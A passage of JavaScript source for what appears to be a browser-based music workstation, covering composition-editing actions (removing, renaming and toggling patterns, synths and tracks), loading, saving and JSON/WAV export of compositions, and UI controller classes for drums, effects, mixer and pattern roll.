		[ "synth", "removeOscillator", get.synth( synthId ).name ],
	];
};

DAWCore.actions.removePattern = ( patId, get ) => {
	const pat = get.pattern( patId ),
		type = pat.type,
		obj = { patterns: { [ patId ]: undefined } },
		blocks = Object.entries( get.blocks() ).reduce( ( blocks, [ blcId, blc ] ) => {
			if ( blc.pattern === patId ) {
				blocks[ blcId ] = undefined;
			}
			return blocks;
		}, {} );

	if ( type === "buffer" ) {
		Object.entries( get.drumrows() ).forEach( kv => {
			if ( kv[ 1 ].pattern === patId ) {
				GSUtils.deepAssign( obj,
					DAWCore.actions._removeDrumrow( obj, kv[ 0 ], get ) );
			}
		} );
	} else {
		obj[ type ] = { [ pat[ type ] ]: undefined };
	}
	if ( GSUtils.isntEmpty( blocks ) ) {
		const realDur = Object.values( get.blocks() )
				.reduce( ( dur, blc ) => {
					return blc.pattern === patId
						? dur
						: Math.max( dur, blc.when + blc.duration );
				}, 0 ),
			bPM = get.beatsPerMeasure(),
			dur = Math.max( 1, Math.ceil( realDur / bPM ) ) * bPM;

		obj.blocks = blocks;
		if ( dur !== get.duration() ) {
			obj.duration = dur;
		}
	}
	if ( type === "keys" ) {
		if ( patId === get.patternKeysOpened() ) {
			if ( !Object.entries( get.patterns() ).some( ( [ k, v ] ) => {
				if ( k !== patId && v.synth === pat.synth ) {
					obj.patternKeysOpened = k;
					return true;
				}
			} ) ) {
				obj.patternKeysOpened = null;
			}
		}
	} else if ( type === "drums" ) {
		if ( patId === get.patternDrumsOpened() ) {
			if ( !Object.entries( get.patterns() ).some( ( [ k, v ] ) => {
				if ( k !== patId && v.type === "drums" ) {
					obj.patternDrumsOpened = k;
					return true;
				}
			} ) ) {
				obj.patternDrumsOpened = null;
			}
		}
	}
	return [
		obj,
		[ "patterns", "removePattern", pat.type, pat.name ],
	];
};

DAWCore.actions.removeSynth = ( synthId, get ) => {
	const keys = {},
		blocks = {},
		patterns = {},
		cmpBlocks = Object.entries( get.blocks() ),
		cmpPatterns = Object.entries( get.patterns() ),
		obj = { synths: { [ synthId ]: undefined } };

	cmpPatterns.forEach( ( [ patId, pat ] ) => {
		if ( pat.synth === synthId ) {
			keys[ pat.keys ] =
			patterns[ patId ] = undefined;
			cmpBlocks.forEach( ( [ blcId, blc ] ) => {
				if ( blc.pattern === patId ) {
					blocks[ blcId ] = undefined;
				}
			} );
		}
	} );
	GSUtils.addIfNotEmpty( obj, "keys", keys );
	GSUtils.addIfNotEmpty( obj, "patterns", patterns );
	GSUtils.addIfNotEmpty( obj, "blocks", blocks );
	if ( synthId === get.synthOpened() ) {
		if ( !Object.keys( get.synths() ).some( k => {
			if ( k !== synthId ) {
				obj.synthOpened = k;
				if ( !cmpPatterns.some( ( [ patId, pat ] ) => {
					if ( pat.synth === k ) {
						obj.patternKeysOpened = patId;
						return true;
					}
				} ) ) {
					obj.patternKeysOpened = null;
				}
				return true;
			}
		} ) ) {
			obj.synthOpened = null;
		}
	}
	return [
		obj,
		[ "synths", "removeSynth", get.synth( synthId ).name ],
	];
};

DAWCore.actions.renameChannel = ( id, newName, get ) => {
	const name = GSUtils.trim2( newName ),
		chan = get.channel( id );

	if ( name && name !== chan.name ) {
		return [
			{ channels: { [ id ]: { name } } },
			[ "channels", "renameChannel", chan.name, name ],
		];
	}
};

DAWCore.actions.renameComposition = ( nameBrut, get ) => {
	const name = GSUtils.trim2( nameBrut ),
		oldName = get.name();

	if ( name && name !== oldName ) {
		return [
			{ name },
			[ "cmp", "renameComposition", oldName, name ],
		];
	}
};

DAWCore.actions.renamePattern = ( id, newName, get ) => {
	const name = GSUtils.trim2( newName ),
		pat = get.pattern( id );

	if ( name && name !== pat.name ) {
		return [
			{ patterns: { [ id ]: { name } } },
			[ "patterns", "renamePattern", pat.type, pat.name, name ],
		];
	}
};

DAWCore.actions.renameSynth = ( id, newName, get ) => {
	const syn = get.synth( id ),
		name = GSUtils.trim2( newName );

	if ( name && name !== syn.name ) {
		return [
			{ synths: { [ id ]: { name } } },
			[ "synths", "renameSynth", syn.name, name ],
		];
	}
};

DAWCore.actions.renameTrack = ( id, newName, get ) => {
	const oldName = get.track( id ).name,
		name = GSUtils.trim2( newName );

	if ( name !== oldName ) {
		return [
			{ tracks: { [ id ]: { name } } },
			[ "tracks", "renameTrack", oldName, name ],
		];
	}
};

DAWCore.actions.reorderChannel = ( chanId, channels, get ) => {
	return [
		{ channels },
		[ "channels", "reorderChannel", get.channel( chanId ).name ],
	];
};

DAWCore.actions.reorderDrumrow = ( rowId, drumrows, get ) => {
	const patName = DAWCore.common.getDrumrowName( rowId, get );

	return [
		{ drumrows },
		[ "drumrows", "reorderDrumrow", patName ],
	];
};

DAWCore.actions.reorderOscillator = ( synthId, oscillators, get ) => {
	return [
		{ synths: { [ synthId ]: { oscillators } } },
		[ "synth", "reorderOscillator", get.synth( synthId ).name ],
	];
};

DAWCore.actions.reorderPattern = ( patId, patterns, get ) => {
	const pat = get.pattern( patId );

	return [
		{ patterns },
		[ "patterns", "reorderPattern", pat.type, pat.name ],
	];
};

DAWCore.actions.selectBlocks = ( blcIds, get ) => {
	const blocks = blcIds.reduce( ( obj, id ) => {
			obj[ id ] = { selected: true };
			return obj;
		}, {} );

	return [
		{ blocks },
		[ "blocks", "selectBlocks", blcIds.length ],
	];
};

DAWCore.actions.selectKeys = ( patId, keyIds, get ) => {
	const pat = get.pattern( patId ),
		keys = keyIds.reduce( ( obj, id ) => {
			obj[ id ] = { selected: true };
			return obj;
		}, {} );

	return [
		{ keys: { [ pat.keys ]: keys } },
		[ "keys", "selectKeys", pat.name, keyIds.length ],
	];
};

DAWCore.actions.toggleChannel = ( id, get ) => {
	const chan = get.channel( id ),
		toggle = !chan.toggle;

	return [
		{ channels: { [ id ]: { toggle } } },
		[ "channels", "toggleChannel", chan.name, toggle ],
	];
};

DAWCore.actions.toggleDrumrow = ( rowId, get ) => {
	const patName = DAWCore.common.getDrumrowName( rowId, get ),
		toggle = !get.drumrow( rowId ).toggle;

	return [
		{ drumrows: { [ rowId ]: { toggle } } },
		[ "drumrows", "toggleDrumrow", patName, toggle ],
	];
};

DAWCore.actions.toggleEffect = ( fxId, get ) => {
	const fx = get.effect( fxId ),
		toggle = !fx.toggle;

	return [
		{ effects: { [ fxId ]: { toggle } } },
		[ "effects", "toggleEffect", get.channel( fx.dest ).name, fx.type, toggle ],
	];
};

DAWCore.actions.toggleEnv = ( synthId, get ) => {
	const toggle = !get.synth( synthId ).env.toggle;

	return [
		{ synths: { [ synthId ]: { env: { toggle } } } },
		[ "synth", "toggleEnv", get.synth( synthId ).name, toggle ],
	];
};

DAWCore.actions.toggleLFO = ( synthId, get ) => {
	const toggle = !get.synth( synthId ).lfo.toggle;

	return [
		{ synths: { [ synthId ]: { lfo: { toggle } } } },
		[ "synth", "toggleLFO", get.synth( synthId ).name, toggle ],
	];
};

DAWCore.actions.toggleSoloDrumrow = ( rowId, get ) => {
	const patName = DAWCore.common.getDrumrowName( rowId, get ),
		[ someOn, drumrows ] = DAWCore.common.toggleSolo( rowId, get.drumrows() );

	return [
		{ drumrows },
		[ "drumrows", "toggleSoloDrumrow", patName, someOn ],
	];
};

DAWCore.actions.toggleSoloTrack = ( id, get ) => {
	const [ someOn, tracks ] = DAWCore.common.toggleSolo( id, get.tracks() );

	return [
		{ tracks },
		[ "tracks", "toggleSoloTrack", get.track( id ).name, someOn ],
	];
};

DAWCore.actions.toggleTrack = ( id, get ) => {
	const track = get.track( id ),
		toggle = !track.toggle;

	return [
		{ tracks: { [ id ]: { toggle } } },
		[ "tracks", "toggleTrack", track.name, toggle ],
	];
};

DAWCore.actions.unselectAllBlocks = get => {
	let len = 0;
	const blocks = Object.entries( get.blocks() ).reduce( ( obj, [ id, blc ] ) => {
			if ( blc.selected ) {
				++len;
				obj[ id ] = { selected: false };
			}
			return obj;
		}, {} );

	return [
		{ blocks },
		[ "blocks", "unselectAllBlocks", len ],
	];
};

DAWCore.actions.unselectAllKeys = ( patId, get ) => {
	let len = 0;
	const pat = get.pattern( patId ),
		keysObj = Object.entries( get.keys( pat.keys ) ).reduce( ( obj, [ id, key ] ) => {
			if ( key.selected ) {
				++len;
				obj[ id ] = { selected: false };
			}
			return obj;
		}, {} );

	return [
		{ keys: { [ pat.keys ]: keysObj } },
		[ "keys", "unselectAllKeys", pat.name, len ],
	];
};

DAWCore.actions.unselectBlock = id => {
	return [
		{ blocks: { [ id ]: { selected: false } } },
		[ "blocks", "unselectBlock" ],
	];
};

DAWCore.actions.unselectKey = ( patId, keyId, get ) => {
	const pat = get.pattern( patId );

	return [
		{ keys: { [ pat.keys ]: { [ keyId ]: { selected: false } } } },
		[ "keys", "unselectKey", pat.name ],
	];
};

DAWCore.prototype.abortWAVExport = function() {
	if ( this.ctx instanceof OfflineAudioContext ) {
		this.composition.stop();
	}
};

DAWCore.prototype.addComposition = function( cmp, opt ) {
	const cpy = GSUtils.jsonCopy( cmp );

	cpy.options = Object.freeze( {
		saveMode: "local",
		...opt,
	} );
	this.cmps[ cpy.options.saveMode ].set( cpy.id, cpy );
	this._call( "compositionAdded", cpy );
	this._call( "compositionSavedStatus", cpy, true );
	return Promise.resolve( cpy );
};

// a read check is missing somewhere...

DAWCore.prototype.addCompositionByBlob = function( blob, opt ) {
	return new Promise( ( res, rej ) => {
		const rd = new FileReader();

		rd.onload = () => {
			this.addCompositionByJSON( rd.result, opt ).then( res, rej );
		};
		rd.readAsText( blob );
	} );
};

DAWCore.prototype.addCompositionByJSON = function( json, opt ) {
	return new Promise( ( res, rej ) => {
		try {
			const cmp = JSON.parse( json );

			this.addComposition( cmp, opt ).then( res, rej );
		} catch ( e ) {
			rej( e );
		}
	} );
};

DAWCore.prototype.addCompositionByURL = function( url, opt ) {
	return fetch( url )
		.then( res => {
			if ( !res.ok ) {
				throw `The file is not accessible: ${ url }`;
			}
			return res.json();
		} )
		.then(
			cmp => this.addComposition( cmp, opt ),
			e => { throw e; }
		);
};

DAWCore.prototype.addCompositionsFromLocalStorage = function() {
	return Promise.all( DAWCore.LocalStorage
		.getAll().map( cmp => this.addComposition( cmp ) ) );
};

DAWCore.prototype.addNewComposition = function( opt ) {
	return this.addComposition(
		DAWCore.json.composition( this.env, GSUtils.uuid() ), opt );
};

DAWCore.prototype.closeComposition = function() {
	if ( this.composition.loaded ) {
		const cmp = this.cmps[ this.get.saveMode() ].get( this.get.id() );

		this.stop();
		this.pianoroll.clearLoop();
		this.pianoroll.setCurrentTime( 0 );
		this.composition.setCurrentTime( 0 );
		this._stopLoop();
		this._call( "compositionClosed", cmp );
		this.composition.unload();
		this.history.empty();
		this.buffers.empty();
		if ( !cmp.savedAt ) {
			this._deleteComposition( cmp );
		}
	}
};

DAWCore.prototype.deleteComposition = function( saveMode, id ) {
	if ( this.composition.cmp && id === this.get.id() ) {
		this.closeComposition();
	}
	this._deleteComposition( this.cmps[ saveMode ].get( id ) );
};

DAWCore.prototype._deleteComposition = function( cmp ) {
	if ( cmp ) {
		const saveMode = cmp.options.saveMode;

		this.cmps[ saveMode ].delete( cmp.id );
		if ( saveMode === "local" ) {
			DAWCore.LocalStorage.delete( cmp.id );
		}
		this._call( "compositionDeleted", cmp );
	}
};

DAWCore.prototype.dropAudioFiles = function( files ) {
	const order = this.buffers.getSize();

	this.buffers.loadFiles( files ).then( ( { newBuffers, knownBuffers, failedBuffers } ) => {
		if ( newBuffers.length || knownBuffers.length ) {
			const cmpBuffers = this.get.buffers(),
				bufNextId = +DAWCore.common.getNextIdOf( cmpBuffers ),
				patNextId = +DAWCore.common.getNextIdOf( this.get.patterns() ),
				buffersLoaded = {};

			if ( newBuffers.length ) {
				const obj = {};

				obj.buffers = {};
				obj.patterns = {};
				newBuffers.forEach( ( buf, i ) => {
					const dotind = buf.name.lastIndexOf( "." ),
						patname = dotind > -1 ? buf.name.substr( 0, dotind ) : buf.name,
						bufId = bufNextId + i;

					obj.buffers[ bufId ] = {
						type: buf.type,
						duration: buf.duration,
						hash: buf.hash,
					};
					obj.patterns[ patNextId + i ] = {
						type: "buffer",
						dest: "main",
						buffer: `${ bufId }`,
						duration: Math.ceil( buf.duration * ( this.get.bpm() / 60 ) ),
						name: patname,
						order: order + i,
					};
					buffersLoaded[ bufId ] = this.buffers.getBuffer( buf );
				} );
				this.callAction( "addBuffers", obj );
			}
			if ( knownBuffers.length ) {
				const bufmap = Object.entries( cmpBuffers )
						.reduce( ( map, [ idBuf, buf ] ) => {
							map.set( buf.hash, idBuf );
							return map;
						}, new Map() );

				knownBuffers.forEach( buf => {
					const idBuf = bufmap.get( buf.hash );

					buffersLoaded[ idBuf ] = this.buffers.getBuffer( buf );
				} );
			}
			this._call( "buffersLoaded", buffersLoaded );
		}
		if ( failedBuffers.length > 0 ) {
			console.log( "failedBuffers", failedBuffers );
			// show a popup
		}
	} );
};

DAWCore.prototype.exportCompositionToJSON = function( saveMode, id ) {
	const cmp = this.get.composition( saveMode, id );

	if ( cmp ) {
		const cpy = GSUtils.jsonCopy( cmp ),
			cpyFormated = DAWCore.Composition.epure( DAWCore.Composition.format( cpy ) );

		return {
			name: `${ cmp.name || "untitled" }.gs`,
			url: this._exportCompositionToJSON( cpyFormated ),
		};
	}
};

DAWCore._exportJSONTabs = {
	keys: 4,
	synths: 5,
	tracks: 3,
	blocks: 3,
	buffers: 3,
	channels: 3,
	patterns: 3,
	drumrows: 3,
};

DAWCore.prototype._exportCompositionToJSON = function( cmp ) {
	const delTabs = DAWCore._exportJSONTabs,
		reg = /^\t"(\w*)": {$/,
		lines = JSON.stringify( cmp, null, "\t" ).split( "\n" );
	let regTab,
		regTa2,
		delTabCurr;

	if ( DAWCore._URLToRevoke ) {
		URL.revokeObjectURL( DAWCore._URLToRevoke );
	}
	lines.forEach( ( line, i ) => {
		const res = reg.exec( line );

		if ( res ) {
			if ( delTabCurr = delTabs[ res[ 1 ] ] ) {
				regTab = new RegExp( `^\\t{${ delTabCurr }}` );
				regTa2 = new RegExp( `^\\t{${ delTabCurr - 1 }}\\}` );
			}
		}
		if ( delTabCurr ) {
			lines[ i ] = lines[ i ].replace( regTab, "~" ).replace( regTa2, "~}" );
		}
	} );
	return DAWCore._URLToRevoke = URL.createObjectURL( new Blob( [
		lines.join( "\n" ).replace( /\n~/g, " " ) ] ) );
};

DAWCore.prototype.exportCompositionToWAV = function() {
	const ctx = this.ctx,
		gain = this.destination.getGain(),
		dur = Math.ceil( this.get.duration() * 60 / this.get.bpm() ) || 1,
		ctxOff = new OfflineAudioContext( 2, dur * ctx.sampleRate | 0, ctx.sampleRate );

	this.stop();
	if ( DAWCore._URLToRevoke ) {
		URL.revokeObjectURL( DAWCore._URLToRevoke );
	}
	this.setCtx( ctxOff );
	this.destination.setGain( 1 );
	this.composition.play();
	return ctxOff.startRendering().then( buffer => {
		const pcm = gswaEncodeWAV.encode( buffer, { float32: true } ),
			url = URL.createObjectURL( new Blob( [ pcm ] ) );

		this.composition.stop();
		this.setCtx( ctx );
		this.destination.setGain( gain );
		DAWCore._URLToRevoke = url;
		return {
			url,
			name: `${ this.get.name() || "untitled" }.wav`,
		};
	} );
};

DAWCore.prototype.liveChangeChannel = function( id, prop, val ) {
	this.composition._wamixer.change( { channels: { [ id ]: { [ prop ]: val } } } );
};

DAWCore.prototype.liveChangeEffect = function( fxId, prop, val ) {
	this.composition._waeffects.liveChangeFxProp( fxId, prop, val );
};

DAWCore.prototype.liveChangeSynth = function( id, obj ) {
	this.composition._synths.get( id ).change( obj );
};

DAWCore.prototype.newComposition = function( opt ) {
	const cmp = DAWCore.json.composition( this.env, GSUtils.uuid() );

	return this.addComposition( cmp, opt )
		.then( cmp => this.composition.load( cmp ) )
		.then( cmp => this._compositionOpened( cmp ) );
};

DAWCore.prototype.openComposition = function( saveMode, id ) {
	const cmp = this.get.composition( saveMode, id );

	if ( cmp ) {
		if ( this.composition.loaded ) {
			this.closeComposition();
		}
		return ( this.get.composition( saveMode, id ) // 1.
			? Promise.resolve( cmp )
			: this.addNewComposition( { saveMode } ) )
				.then( cmp => this.composition.load( cmp ) )
				.then( cmp => this._compositionOpened( cmp ) );
	}
};

DAWCore.prototype._compositionOpened = function( cmp ) {
	this.compositionFocus();
	this._call( "compositionOpened", cmp );
	this._startLoop();
	return cmp;
};

/*
1. Why don't we use `cmp` instead of recalling .get.composition() ?
   Because the `cmp` could have been delete in .closeComposition()
   if the composition was a new untitled composition.
*/

DAWCore.prototype.saveComposition = function() {
	const actSave = this.composition._actionSavedOn;

	if ( this.composition.save() ) {
		const cmp = this.get.cmp(),
			id = this.get.id();

		if ( this.get.saveMode() === "local" ) {
			this.cmps.local.set( id, cmp );
			DAWCore.LocalStorage.put( id, cmp );
			this._call( "compositionSavedStatus", cmp, true );
		} else {
			this.composition._saved = false;
			this._call( "compositionLoading", cmp, true );
			( this._call( "compositionSavingPromise", cmp )
			|| Promise.resolve( cmp ) )
				.finally( this._call.bind( this, "compositionLoading", cmp, false ) )
				.then( res => {
					this.composition._saved = true;
					this.cmps.cloud.set( id, cmp );
					this._call( "compositionSavedStatus", cmp, true );
					return res;
				}, err => {
					this.composition._actionSavedOn = actSave;
					this._call( "compositionSavedStatus", cmp, false );
					throw err;
				} );
		}
	}
};

class GSDrums {
	constructor() {
		const uiDrums = document.createElement( "gsui-drums" ),
			uiDrumrows = uiDrums.drumrows,
			dataDrums = new DAWCore.controllers.drums( {
				dataCallbacks: {
					addDrum: ( id, drum ) => uiDrums.addDrum( id, drum ),
					addDrumcut: ( id, drumcut ) => uiDrums.addDrumcut( id, drumcut ),
					changeDrum: ( id, prop, val ) => uiDrums.changeDrum( id, prop, val ),
					removeDrum: id => uiDrums.removeDrum( id ),
					removeDrumcut: id => uiDrums.removeDrumcut( id ),
				},
			} ),
			dataDrumrows = new DAWCore.controllers.drumrows( {
				dataCallbacks: {
					addDrumrow: id => {
						uiDrumrows.add( id, uiDrums.createDrumrow( id ) );
						this._setPropFilter( id, "gain" );
					},
					removeDrumrow: id => uiDrumrows.remove( id ),
					changeDrumrow: ( id, prop, val ) => {
						switch ( prop ) {
							default:
								uiDrumrows.change( id, prop, val );
								break;
							case "pattern":
								uiDrumrows.change( id, prop, this._svgManager.createSVG( val ) );
							break;
							case "duration": {
								const patId = this._dawcore.get.drumrow( id ).pattern,
									bufId = this._dawcore.get.pattern( patId ).buffer;

								uiDrumrows.change( id, prop, this._dawcore.get.buffer( bufId ).duration );
							} break;
						}
					},
				},
			} );

		this.rootElement = uiDrums;
		this.timeline = uiDrums._win._elTimeline;
		this._uiDrums = uiDrums;
		this._uiDrumrows = uiDrumrows;
		this._dataDrums = dataDrums;
		this._dataDrumrows = dataDrumrows;
		this._dawcore =
		this._drumsId =
		this._patternId =
		this._svgManager = null;
		Object.seal( this );

		uiDrumrows.addEventListener( "gsuiEvents", e => {
			const d = e.detail;

			switch ( d.eventName ) {
				case "change": this._dawcore.callAction( ...d.args ); break;
				case "propFilter": this._setPropFilter( ...d.args ); break;
				case "propFilters": this._setAllPropFilters( ...d.args ); break;
				case "liveStopDrum": this._dawcore.drums.stopLiveDrum( ...d.args ); break;
				case "liveStartDrum": this._dawcore.drums.startLiveDrum( ...d.args ); break;
				case "liveChangeDrumrow": this._dawcore.drums.changeLiveDrumrow( ...d.args ); break;
				default: return;
			}
			e.stopPropagation();
		} );
		uiDrums.addEventListener( "gsuiEvents", e => {
			const d = e.detail;

			switch ( d.eventName ) {
				case "change": {
					const [ act, ...args ] = d.args;

					this._dawcore.callAction( act, this._patternId, ...args );
				} break;
				case "input":
					this._uiDrumrows.setDrumPropValue( d.args[ 0 ], d.args[ 2 ], d.args[ 3 ] );
					break;
				case "inputEnd":
					this._uiDrumrows.removeDrumPropValue( ...d.args );
					break;
				case "changeLoop": {
					const [ a, b ] = d.args;

					a !== false
						? this._dawcore.drums.setLoop( a, b )
						: this._dawcore.drums.clearLoop();
				} break;
				case "changeCurrentTime":
					this._dawcore.drums.setCurrentTime( d.args[ 0 ] );
					break;
				default: return;
			}
			e.stopPropagation();
		} );
		this._uiDrums.toggleShadow( true );
	}

	// .........................................................................
	setDAWCore( core ) {
		this._dawcore = core;
	}
	selectPattern( id ) {
		if ( id !== this._patternId ) {
			this._patternId = id;
			this._drumsId = null;
			this._dataDrums.clear();
			this._uiDrums.toggleShadow( !id );
			if ( id ) {
				const pat = this._dawcore.get.pattern( id ),
					drums = this._dawcore.get.drums( pat.drums );

				this._drumsId = pat.drums;
				this._dataDrums.change( drums );
			}
		}
	}
	setWaveforms( svgManager ) {
		this._svgManager = svgManager;
	}
	onstartdrum( rowId ) {
		this._uiDrumrows.playRow( rowId );
	}
	onstopdrumrow( rowId ) {
		this._uiDrumrows.stopRow( rowId );
	}
	change( obj ) {
		const drmObj = obj.drums && obj.drums[ this._drumsId ];

		this._dataDrumrows.change( obj );
		if ( obj.drumrows ) {
			this._uiDrums.drumrows.reorderDrumrows( obj.drumrows );
		}
		if ( "beatsPerMeasure" in obj || "stepsPerBeat" in obj ) {
			const bPM = obj.beatsPerMeasure || this._dawcore.get.beatsPerMeasure(),
				sPB = obj.stepsPerBeat || this._dawcore.get.stepsPerBeat();

			this._uiDrums.timeSignature( bPM, sPB );
		}
		if ( drmObj ) {
			this._dataDrums.change( drmObj );
		}
		if ( "patternDrumsOpened" in obj ) {
			this.selectPattern( obj.patternDrumsOpened );
		}
	}
	clear() {
		this.selectPattern( null );
		this._dataDrumrows.clear();
	}

	// .........................................................................
	setFontSize( fs ) {
		this._uiDrums.setFontSize( fs );
	}
	setPxPerBeat( ppb ) {
		this._uiDrums.setPxPerBeat( ppb );
	}
	currentTime( beat ) {
		this._uiDrums.currentTime( beat );
	}
	loop( a, b ) {
		this._uiDrums.loop( a, b );
	}

	// .........................................................................
	_setPropFilter( rowId, prop ) {
		const propValues = Object.entries( this._dawcore.get.drums( this._drumsId ) )
				.filter( ( [, drm ] ) => drm.row === rowId && "gain" in drm )
				.map( ( [ id, drm ] ) => [ id, drm[ prop ] ] );

		this._uiDrumrows.setPropFilter( rowId, prop );
		this._uiDrums.setPropValues( rowId, prop, propValues );
	}
	_setAllPropFilters( prop ) {
		Object.keys( this._dawcore.get.drumrows() )
			.forEach( id => this._setPropFilter( id, prop ) );
	}
}

Object.freeze( GSDrums );

class GSEffects {
	constructor() {
		const uiEffects = new gsuiEffects(),
			ctrlEffects = new DAWCore.controllers.effects( {
				dataCallbacks: {
					addEffect: ( id, obj ) => uiEffects.addEffect( id, obj ),
					removeEffect: id => uiEffects.removeEffect( id ),
					changeEffect: ( id, prop, val ) => uiEffects.changeEffect( id, prop, val ),
					changeEffectData: ( id, obj ) => this._changeEffectData( id, obj ),
				},
			} );

		this.rootElement = uiEffects;
		this._ctrlEffects = ctrlEffects;
		this._dawcore = null;
		this._destFilter = "main";
		Object.seal( this );

		uiEffects.askData = ( fxId, fxType, dataType, ...args ) => {
			if ( fxType === "filter" && dataType === "curve" ) {
				const wafx = this._dawcore.get.audioEffect( fxId );

				return wafx && wafx.updateResponse( args[ 0 ] );
			}
		};
		GSUI.listenEvent( uiEffects, {
			gsuiEffects: {
				liveChangeEffect: d => {
					this._dawcore.liveChangeEffect( ...d.args );
				},
				addEffect: d => {
					d.args.unshift( this._destFilter );
					this._dawcore.callAction( "addEffect", ...d.args );
				},
				default: d => {
					this._dawcore.callAction( d.eventName, ...d.args );
				},
			},
		} );
	}

	// .........................................................................
	setDAWCore( core ) {
		this._dawcore = core;
	}
	getDestFilter() {
		return this._destFilter;
	}
	setDestFilter( dest ) {
		this._destFilter = dest;
		this._ctrlEffects.setDestFilter( dest );
	}
	change( obj ) {
		this._ctrlEffects.change( obj );
		if ( obj.effects ) {
			this.rootElement.reorderEffects( obj.effects );
		}
	}
	clear() {
		this._ctrlEffects.clear();
	}

	// .........................................................................
	_changeEffectData( id, obj ) {
		const uiFx = this.rootElement._fxsHtml.get( id ).uiFx;

		Object.entries( obj ).forEach( kv => GSUI.setAttribute( uiFx, ...kv ) );
		if ( uiFx.updateWave ) {
			uiFx.updateWave();
		}
	}
}

Object.freeze( GSEffects );

class GSMixer {
	constructor() {
		const uiMixer = new gsuiMixer( {
				oninput: this._oninput.bind( this ),
				onchange: this._onchange.bind( this ),
				onselectChan: this._onselectChan.bind( this ),
			} ),
			ctrlMixer = new DAWCore.controllers.mixer( {
				dataCallbacks: {
					addChannel: ( id, chan ) => uiMixer.addChannel( id, chan ),
					removeChannel: id => uiMixer.removeChannel( id ),
					renameChannel: ( id, name ) => uiMixer.renameChannel( id, name ),
					redirectChannel: ( id, dest ) => uiMixer.redirectChannel( id, dest ),
					toggleChannel: ( id, b ) => uiMixer.toggleChannel( id, b ),
					reorderChannel: ( id, n ) => uiMixer.reorderChannel( id, n ),
					changePanChannel: ( id, val ) => uiMixer.changePanChannel( id, val ),
					changeGainChannel: ( id, val ) => uiMixer.changeGainChannel( id, val ),
				},
			} );

		this.rootElement = uiMixer.rootElement;
		this.onselectChan = null;
		this._uiMixer = uiMixer;
		this._ctrlMixer = ctrlMixer;
		this._dawcore = null;
		Object.seal( this );
	}

	// .........................................................................
	setDAWCore( core ) {
		this._dawcore = core;
	}
	clear() {
		this._ctrlMixer.clear();
	}
	change( obj ) {
		this._ctrlMixer.change( obj );
		if ( obj.channels ) {
			this._uiMixer.reorderChannels( obj.channels );
		}
	}
	resize() {
		this._uiMixer.resized();
	}
	resizing() {
		this._uiMixer.resized();
	}
	attached() {
		this._uiMixer.attached();
	}
	updateAudioData( chanId, ldata, rdata ) {
		this._uiMixer.updateAudioData( chanId, ldata, rdata );
	}
	selectChannel( id ) {
		this._uiMixer.selectChannel( id );
	}
	getSelectedChannelId() {
		return this._uiMixer.getSelectedChannelId();
	}

	// .........................................................................
	_oninput( id, prop, val ) {
		this._dawcore.liveChangeChannel( id, prop, val );
	}
	_onchange( act, ...args ) {
		this._dawcore.callAction( act, ...args );
	}
	_onselectChan( id ) {
		if ( this.onselectChan ) {
			this.onselectChan( id );
		}
	}
}

Object.freeze( GSMixer );

class GSPatternroll {
	constructor() {
		const uiPatternroll = new gsuiPatternroll( {
				getData: () => dataBlocks.data,
				onchange: this._onchange.bind( this ),
				onaddBlock: this._onaddBlock.bind( this ),
				oneditBlock: this._oneditBlock.bind( this ),
			} ),
			dataTracks = new DAWCore.controllers.tracks( {
				dataCallbacks: {
					addTrack: id => uiPatternroll.addTrack( id ),
					removeTrack: id => uiPatternroll.removeTrack( id ),
					toggleTrack: ( id, b ) => uiPatternroll.toggleTrack( id, b ),
					renameTrack: ( id, s ) => uiPatternroll.renameTrack( id, s ),
					reorderTrack: ( id, n ) => uiPatternroll.reorderTrack( id, n ),
				}
			} ),
			dataBlocks = new DAWCore.controllers.blocks( {
				dataCallbacks: {
					addBlock: ( id, blc ) => uiPatternroll.addBlock( id, blc ),
					removeBlock: id => uiPatternroll.removeBlock( id ),
					changeBlockProp: ( id, prop, val ) => uiPatternroll.changeBlockProp( id, prop, val ),
					updateBlockViewBox: ( id, blc ) => uiPatternroll.updateBlockViewBox( id, blc ),
				},
			} );

		this.rootElement = uiPatternroll.rootElement;
		this.timeline = uiPatternroll.timeline;
		this._uiRoll = uiPatternroll;
		this._dataTracks = dataTracks;
		this._dataBlocks = dataBlocks;
		this._dawcore =
		this._svgForms = null;
		Object.seal( this );

		this.rootElement.addEventListener( "gsuiEvents", this._ongsuiEvents.bind( this ) );
	}

	// .........................................................................
	setDAWCore( core ) {
		this._dawcore = core;
	}
	setSVGForms( svgForms ) {
		this._svgForms = svgForms;
	}
	change( obj ) {
		this._dataTracks.change( obj );
		this._dataBlocks.change( obj );
		if ( "loopA" in obj || "loopB" in obj ) {
			this._uiRoll.loop(
				this._dawcore.get.loopA(),
				this._dawcore.get.loopB() );
		}
		if ( "beatsPerMeasure" in obj || "stepsPerBeat" in obj ) {
			this._uiRoll.timeSignature(
				this._dawcore.get.beatsPerMeasure(),
				this._dawcore.get.stepsPerBeat() );
		}
	}
	clear() {
		this._dataBlocks.clear();
		this._dataTracks.clear();
	}

	// .........................................................................
	attached() {
		this._uiRoll.attached();
	}
	resized() {
		this._uiRoll.resized();
	}
	currentTime( t ) {
		this._uiRoll.currentTime( t );
	}
	loop( a, b ) {
		this._uiRoll.loop( a, b );
	}
	getBlocks() {
		return this._uiRoll.getBlocks();
	}

	// .........................................................................
	_ongsuiEvents( e ) {
		const d = e.detail;

		switch ( d.component ) {
			case "gsuiTracklist":
				this._dawcore.callAction( d.eventName, ...d.args );
				break;
			case "gsuiTimeline":
				switch ( d.eventName ) {
					case "changeLoop":
						this._dawcore.callAction( "changeLoop", ...d.args );
						break;
					case "changeCurrentTime":
						this._dawcore.composition.setCurrentTime( d.args[ 0 ] );
						break;
				}
				break;
		}
		e.stopPropagation();
	}

	// .........................................................................
	_onchange( obj, ...args ) {
		switch ( obj ) { // tmp
			case "add": this._dawcore.callAction( "addBlock", ...args ); break;
			case "move": this._dawcore.callAction( "moveBlocks", ...args ); break;
			case "cropEnd": this._dawcore.callAction( "cropEndBlocks", ...args ); break;
			case "cropStart": this._dawcore.callAction( "cropStartBlocks", ...args ); break;
			case "duplicate": this._dawcore.callAction( "duplicateSelectedBlocks", ...args ); break;
			case "deletion": this._dawcore.callAction( "removeBlocks", ...args ); break;
			case "selection": this._dawcore.callAction( "selectBlocks", ...args ); break;
			case "unselection": this._dawcore.callAction( "unselectAllBlocks", ...args ); break;
			case "unselectionOne": this._dawcore.callAction( "unselectBlock", ...args ); break;
		}
	}
	_oneditBlock( _id, obj, blc ) {
		if ( blc._gsuiSVGform ) {
			const pat = this._dawcore.get.pattern( obj.pattern );

